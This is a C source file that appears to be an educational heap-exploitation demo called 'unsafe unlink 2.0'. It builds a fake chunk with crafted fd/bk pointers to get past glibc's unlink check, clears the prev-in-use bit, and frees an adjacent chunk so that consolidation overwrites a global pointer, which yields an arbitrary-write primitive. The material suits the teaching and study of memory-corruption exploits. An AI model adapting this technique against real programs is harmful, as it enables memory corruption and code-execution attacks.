#include <stdio.h>
#include <stdlib.h>

unsigned long long* pointer_vector[10];

int main()
{
	printf("Welcome to unsafe unlink 2.0!\n");

	int malloc_size = 0x80; //we want to be big enough not to use fastbins
	int header_size = 2*8;

	printf("We create an array of pointers to malloc'ed regions.\n");
	printf("The point of this exercise is to use malloc to corrupt one of these pointers.\n");

	pointer_vector[0] = (unsigned long long*) malloc(malloc_size);
	pointer_vector[1] = (unsigned long long*) malloc(malloc_size);
	pointer_vector[2] = (unsigned long long*) malloc(malloc_size);
	unsigned long long* chunk2_ptr = pointer_vector[2] - 2;

	printf("The pointer vector starts at: %p\n",&(pointer_vector[0]));
	printf("Allocated regions: %p %p %p\n",pointer_vector[0],pointer_vector[1],pointer_vector[2]);
	
	printf("We create a fake chunk inside in the second allocated region.\n");
	printf("The next free chunk of our fake chunk will be our pointer vector.\n");
	pointer_vector[1][2] = (unsigned long long) &(pointer_vector[1])-(8*3);
	printf("The previous free chunk of our fake chunk will be our pointer vector.\n");
	printf("We do this to pass this check: (P->fd->bk != P || P->bk->fd != P)\n");
	pointer_vector[1][3] = (unsigned long long) &(pointer_vector[1])-(8*2);

	printf("We shrink the size of chunk1 (saved as 'previous size' in chunk2) so that free will think that chunk1 starts where we placed our fake chunk.\n");
	chunk2_ptr[0] = malloc_size;
	printf("We mark our fake chunk as free by setting 'previous in use' of chunk2 as False\n");
	chunk2_ptr[1] &= ~1;
	
	printf("Now we free chunk2 so that consolidate backward will unlink our fake chunk, overwriting pointer_vector[1]\n");
	free(pointer_vector[2]);

	printf("Allocated regions: %p %p %p\n",pointer_vector[0],pointer_vector[1],pointer_vector[2]);

	printf("At this point you can write data at pointer_vector[1] to change pointer_vector[0] to any address you want to write to.\n");
}


